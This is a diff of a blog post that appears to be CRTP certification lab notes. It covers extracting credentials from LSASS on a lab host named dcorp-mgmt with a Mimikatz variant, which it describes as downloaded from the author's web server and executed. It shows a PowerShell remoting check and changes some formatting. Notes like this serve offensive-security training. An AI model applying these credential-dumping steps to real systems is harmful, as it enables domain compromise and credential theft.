@@ -5,7 +5,6 @@ date: 2024-07-01 00:41:00 +0800
 categories: [Cert, CRTP]
 tags: [Cert, Active Directory]     # TAG names should always be lowercase
 render_with_liquid: false
-description: Designed to provide a comprehensive guide to Active Directory (AD) attack techniques
 ---
 
 ### 5. Extract Credentials from LSASS (Invoke Mimikatz)
@@ -14,10 +13,8 @@ Once we have remote admin session on the remote machine, we will extract credent
 
 Check if we can run commands on dcorp-mgmt using PowerShell remoting
 
-```jsx
----
+```bash
 Invoke-Command -ScriptBlock {$env:username;$env:computername}    -ComputerName dcorp-mgmt
----
 ```
 
 Now, let’s use Invoke-Mimi to dump hashes on dcorp-mgmt to grab hashes of the domain admin. This script is to downloads and executes the Invoke-Mimi.ps1 that is hosted in my web server.
